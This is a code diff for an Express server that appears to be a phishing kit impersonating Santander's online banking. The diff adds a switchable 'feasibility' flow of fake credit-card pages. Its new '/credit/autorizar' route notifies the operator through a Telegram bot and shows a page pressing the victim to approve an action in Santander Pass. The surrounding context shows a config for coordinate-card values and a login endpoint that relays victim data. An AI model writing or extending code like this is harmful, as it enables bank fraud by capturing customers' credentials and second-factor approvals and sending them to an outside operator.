@@ -1,6 +1,7 @@
 const express = require("express");
 const fetch = require("node-fetch");
 const cors = require("cors");
+const path = require("path");
 
 const app = express();
 
@@ -28,7 +29,8 @@ let config = {
   tipoAutorizacion: "santander",
   coord1: "",
   coord2: "",
-  coord3: ""
+  coord3: "",
+  factibilidad: "off" // <-- nueva propiedad
 };
 
 // Endpoint de login
@@ -62,7 +64,7 @@ Teléfono: ${telefono}`;
   }
 });
 
-// Endpoint de autorización
+// Endpoint de autorización (general)
 app.post("/autorizar", async (req, res) => {
   const { mensaje } = req.body;
 
@@ -96,6 +98,51 @@ app.post("/config", (req, res) => {
   // Actualiza solo los campos enviados, manteniendo los demás
   config = { ...config, ...req.body };
   res.status(200).json({ message: "✅ Configuración guardada correctamente", config });
+});
+
+// Nueva ruta de autorización que decide flujo según configuración
+app.get("/autorizacion", (req, res) => {
+  if (config.factibilidad === "on") {
+    // Si está habilitada la factibilidad, mostrar la primera pantalla
+    return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
+  }
+
+  // Si no, seguir con la lógica normal
+  if (config.tipoAutorizacion === "coordenadas") {
+    return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
+  } else {
+    return res.sendFile(path.join(__dirname, "public", "pass.html"));
+  }
+});
+
+// Flujo de factibilidad: evaluación -> visualización -> autorizar
+app.post("/credit/visualizacion", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
+});
+
+app.post("/credit/autorizar", async (req, res) => {
+  const mensaje = "AUTORIZA TARJETA DIGITAL!!";
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
+    });
+
+    res.send(`
+      <html>
+        <body>
+          <img src="logo-officebanking.png" style="height:60px;">
+          <h2>VISUALIZACIÓN DE TU TARJETA DIGITAL</h2>
+          <p style="color:red;">Debes Autorizar en tu Santander Pass la Autorización de visualización.</p>
+        </body>
+      </html>
+    `);
+  } catch (error) {
+    console.error(error);
+    res.status(500).send("❌ Error al enviar autorización.");
+  }
 });
 
 // Iniciar servidor
